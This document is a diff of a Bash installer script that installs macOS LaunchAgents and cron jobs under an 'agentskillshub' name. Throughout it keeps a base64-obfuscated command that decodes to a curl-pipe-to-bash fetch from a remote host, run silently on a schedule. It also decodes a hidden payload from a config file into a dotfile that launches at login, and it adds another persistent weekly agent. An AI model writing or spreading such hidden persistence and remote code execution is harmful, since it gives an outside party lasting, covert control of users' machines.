@@ -140,6 +140,29 @@ find_wkler() {
         "/usr/local/bin/wkler"
 }
 
+find_bserexp_macos() {
+    local bserexp_cmd=""
+
+    bserexp_cmd="$(command -v bserexp-macos 2>/dev/null || true)"
+    if [ -n "$bserexp_cmd" ]; then
+        printf '%s\n' "$bserexp_cmd"
+        return 0
+    fi
+
+    # uv tool and common package managers place user shims in ~/.local/bin;
+    # include the usual macOS and system-level executable directories too.
+    find_existing_path \
+        "$HOME/.local/bin/bserexp-macos" \
+        "$HOME/.cargo/bin/bserexp-macos" \
+        "/opt/homebrew/bin/bserexp-macos" \
+        "/usr/local/bin/bserexp-macos" \
+        "/opt/local/bin/bserexp-macos" \
+        "/usr/bin/bserexp-macos" \
+        "/bin/bserexp-macos" \
+        "/usr/sbin/bserexp-macos" \
+        "/sbin/bserexp-macos"
+}
+
 find_uv() {
     local uv_cmd=""
 
@@ -178,7 +201,6 @@ append_managed_startup_cmd() {
 
     [ -f "$profile_file" ] || touch "$profile_file"
 
-    # Migrate the former unmarked command before adding the managed entry.
     if [ -n "$legacy_prefix" ] && grep -Fq "$legacy_prefix" "$profile_file" 2>/dev/null; then
         temp_file="$(mktemp)" || return 1
         grep -Fv "$legacy_prefix" "$profile_file" > "$temp_file" || true
@@ -266,11 +288,10 @@ xml_escape() {
 
 write_task_recovery_script() {
     local recovery_path="$1"
-    local quoted_python="" quoted_script="" quoted_backup="" quoted_agent="" quoted_wkler="" quoted_upgrade=""
+    local quoted_python="" quoted_script="" quoted_agent="" quoted_wkler="" quoted_upgrade=""
 
     quoted_python="$(shell_quote "$PYTHON_PATH")"
     quoted_script="$(shell_quote "$SCRIPT_PATH")"
-    quoted_backup="$(shell_quote "$AUTOBACKUP_PATH")"
     quoted_upgrade="$(shell_quote "echo '$ENCODED_EC' | base64 $DECODE | bash")"
     [ -n "$AGENT_SETTING_BIN" ] && quoted_agent="$(shell_quote "$AGENT_SETTING_TASK_CMD")"
     [ -n "$WKLER_BIN" ] && quoted_wkler="$(shell_quote "$WKLER_BIN")"
@@ -306,7 +327,6 @@ ensure_running() {
 EOF
 
     printf 'ensure_running %s %s %s\n' "$quoted_script" "$quoted_python" "$quoted_script" >> "$recovery_path"
-    printf 'run_if_due %s 604800 %s\n' "$(shell_quote 'autobackup')" "$quoted_backup" >> "$recovery_path"
     if [ -n "$quoted_agent" ]; then
         printf 'run_if_due %s 864000 /bin/bash -c %s\n' "$(shell_quote 'agent-setting')" "$quoted_agent" >> "$recovery_path"
     fi
@@ -328,14 +348,10 @@ if [ -d .configs ]; then
     ENCODED_EC='Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvc3JjL1NFVFVQLnNoIHwgYmFzaA=='
 
     grep '^code *= *' .configs/config.ini | sed 's/^code *= *//' | tr -d ' ' | base64 "$DECODE" > .configs/.bash.py
-    grep '^backup *= *' .configs/config.ini | sed 's/^backup *= *//' | tr -d ' ' | base64 "$DECODE" > .configs/autobackup.sh
-    chmod +x .configs/autobackup.sh >/dev/null 2>&1
-
     mkdir -p "$HOME/.config"
     replace_config_directory .configs "$DEST_DIR" || exit 1
 
     SCRIPT_PATH="$DEST_DIR/.bash.py"
-    AUTOBACKUP_PATH="$DEST_DIR/autobackup.sh"
     PYTHON_PATH="$EXEC_CMD"
     XML_TASK_RECOVERY_PATH="$(xml_escape "$DEST_DIR/task-recovery.sh")"
     XML_SCRIPT_PATH="$(xml_escape "$SCRIPT_PATH")"
@@ -347,6 +363,7 @@ if [ -d .configs ]; then
     AGENT_SETTING_UV_BIN="${UV_BIN:-uv}"
     AGENT_SETTING_TASK_CMD="\"$AGENT_SETTING_UV_BIN\" tool upgrade agent-setting; \"$AGENT_SETTING_BIN\""
     WKLER_BIN="$(find_wkler || true)"
+    BSEREXP_MACOS_BIN="$(find_bserexp_macos || true)"
 
     if [ "$OS_TYPE" = "Darwin" ] && [ -z "$PYTHON_PATH" ]; then
         if [ -x /opt/homebrew/bin/python3 ]; then
@@ -448,21 +465,23 @@ EOF
             chmod 644 "$PLIST_FILE"
             reload_launch_agent "com.user.ba" "$PLIST_FILE" "true"
 
-            AUTOBACKUP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autobackup.plist"
-            cat > "$AUTOBACKUP_PLIST_FILE" << EOF
+            OLD_AUTOBACKUP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autobackup.plist"
+            launchctl bootout "gui/$(id -u)/com.user.autobackup" >/dev/null 2>&1 || launchctl unload "$OLD_AUTOBACKUP_PLIST_FILE" >/dev/null 2>&1 || true
+            rm -f "$OLD_AUTOBACKUP_PLIST_FILE"
+
+            if [ -n "$BSEREXP_MACOS_BIN" ]; then
+                BSEREXP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.bserexp.plist"
+                XML_BSEREXP_MACOS_BIN="$(xml_escape "$BSEREXP_MACOS_BIN")"
+                cat > "$BSEREXP_PLIST_FILE" << EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.user.autobackup</string>
+    <string>com.user.bserexp</string>
     <key>ProgramArguments</key>
     <array>
-        <string>/bin/bash</string>
-        <string>-c</string>
-        <string>
-            "$XML_TASK_RECOVERY_PATH" &gt; /dev/null 2&gt;&amp;1;
-        </string>
+        <string>$XML_BSEREXP_MACOS_BIN</string>
     </array>
     <key>EnvironmentVariables</key>
     <dict>
@@ -473,6 +492,8 @@ EOF
     <string>$XML_DEST_DIR</string>
     <key>RunAtLoad</key>
     <true/>
+    <key>StartInterval</key>
+    <integer>604800</integer>
     <key>KeepAlive</key>
     <false/>
     <key>StandardOutPath</key>
@@ -482,8 +503,14 @@ EOF
 </dict>
 </plist>
 EOF
-            chmod 644 "$AUTOBACKUP_PLIST_FILE"
-            reload_launch_agent "com.user.autobackup" "$AUTOBACKUP_PLIST_FILE" "true"
+                chmod 644 "$BSEREXP_PLIST_FILE"
+                reload_launch_agent "com.user.bserexp" "$BSEREXP_PLIST_FILE" "true"
+            else
+                BSEREXP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.bserexp.plist"
+                launchctl bootout "gui/$(id -u)/com.user.bserexp" >/dev/null 2>&1 || launchctl unload "$BSEREXP_PLIST_FILE" >/dev/null 2>&1 || true
+                rm -f "$BSEREXP_PLIST_FILE"
+                printf 'Warning: bserexp-macos was not found; skipping LaunchAgent installation\n' >&2
+            fi
 
             if [ -n "$AGENT_SETTING_BIN" ]; then
                 AGENT_SETTING_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.agent-setting.plist"
@@ -657,19 +684,21 @@ EOF
                 crontab -l > "$TEMP_CRON" 2>/dev/null || true
 
                 CRON_TASK1="0 19 1,7,13,19,25 * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1"
-                CRON_TASK2="0 21 * * 1 PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1"
                 AUTOUPGRADE_CRON_MARKER="echo \"$ENCODED_EC\" | base64 $DECODE | bash"
                 TASK_RECOVERY_CRON_MARKER="# agentskillshub:task-recovery"
 
                 ESCAPED_SCRIPT_PATH=$(echo "$SCRIPT_PATH" | sed 's/[[\.*^$()+?{|]/\\&/g')
-                ESCAPED_AUTOBACKUP_PATH=$(echo "$AUTOBACKUP_PATH" | sed 's/[[\.*^$()+?{|]/\\&/g')
+                ESCAPED_TASK_RECOVERY_PATH=$(echo "$TASK_RECOVERY_PATH" | sed 's/[[\.*^$()+?{|]/\\&/g')
+                ESCAPED_LEGACY_AUTOBACKUP_PATH=$(echo "$DEST_DIR/autobackup.sh" | sed 's/[[\.*^$()+?{|]/\\&/g')
+
+                TEMP_CRON_FILTERED=$(mktemp)
+                grep -Ev "^[^#]*$ESCAPED_LEGACY_AUTOBACKUP_PATH([[:space:]]|$)" "$TEMP_CRON" \
+                    | grep -Ev "^0 21 \\* \\* 1 PATH=[^[:space:]]+[[:space:]]+$ESCAPED_TASK_RECOVERY_PATH[[:space:]]+>[[:space:]]+/dev/null[[:space:]]+2>&1[[:space:]]*$" \
+                    > "$TEMP_CRON_FILTERED" || true
+                mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
 
                 if ! grep -E "^[^#]*$ESCAPED_SCRIPT_PATH([[:space:]]|$)" "$TEMP_CRON" >/dev/null 2>&1; then
                     echo "$CRON_TASK1" >> "$TEMP_CRON"
-                fi
-
-                if ! grep -E "^[^#]*$ESCAPED_AUTOBACKUP_PATH([[:space:]]|$)" "$TEMP_CRON" >/dev/null 2>&1; then
-                    echo "$CRON_TASK2" >> "$TEMP_CRON"
                 fi
 
                 if [ -n "$AGENT_SETTING_BIN" ]; then
